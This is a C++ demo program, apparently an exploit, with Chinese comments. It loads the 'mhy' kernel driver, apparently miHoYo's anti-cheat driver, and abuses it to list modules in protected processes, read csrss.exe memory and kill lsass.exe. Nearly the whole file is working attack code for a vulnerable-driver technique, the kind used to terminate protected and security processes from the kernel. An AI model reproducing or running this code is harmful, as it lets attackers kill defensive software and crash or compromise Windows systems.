// mhy_exp.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <memory>
#include <random>

#include "mhy_driver.hpp"
#include "utils.hpp"

//
// demo
//


int main()
{
	// Hello
	std::cout << "[MHY EXP] Hello Mhy Driver Exp!\n";

	// Exp
	static mhy* exp = mhy::instance();

	// load
	if (exp->load())
	{
		std::cout << "[MHY EXP] Mhy Driver Load Success!" << std::endl;

		do
		{
			// 进程ID
			uint32_t pid = utils::get_process_id("csrss.exe");
			std::cout << "[MHY EXP] csrss.exe process_id = 0x" << std::hex << pid << std::endl;
			if (pid == 0)
			{
				break;
			}

			//// 进程基址 普通Api获取不到base
			//uint64_t base = utils::get_process_base(pid);
			//std::cout << "[MHY EXP] csrss.exe process_base = 0x" << std::hex << base << std::endl;
			//if (base == 0)
			//{
			//	break;
			//}

			// 系统基址
			uint64_t ntos = utils::get_sysmodule_base("ntoskrnl.exe");
			std::cout << "[MHY EXP] ntoskrnl.exe system_base = 0x" << std::hex << ntos << std::endl;
			if (ntos == 0)
			{
				break;
			}

			// 驱动读模块
			std::vector<mhy::module_info> mods;
			auto success = exp->modules(mods, pid);
			if (!success)
			{
				break;
			}

			uint64_t base = exp->module_base(mods, L"csrss.exe");
			base = exp->module_base(pid, L"csrss.exe");
			if (base == 0)
			{
				break;
			}

			// 驱动读进程
			IMAGE_DOS_HEADER header = exp->rpm<IMAGE_DOS_HEADER>(pid, base);
			std::cout << "[MHY EXP] rpm csrss.exe in base = 0x" << std::hex << header.e_magic << std::endl;
			if (header.e_magic != IMAGE_DOS_SIGNATURE)
			{
				break;
			}

			// 驱动干进程
			auto lsass = utils::get_process_id("lsass.exe");
			success = exp->kill(lsass);
			if (!success)
			{
				break;
			}

		} while (false);

	}
	else
	{
		std::cout << "[MHY EXP] Mhy Driver Load Failed!" << std::endl;
	}

	// ready to exit
	std::cout << "[MHY EXP] Press any key to unload the driver..." << std::endl;
	int c = getchar();
	exp->unload();
	std::cout << "[MHY EXP] Mhy Driver Unload!!!" << std::endl;
	system("pause");
	return 0;
}
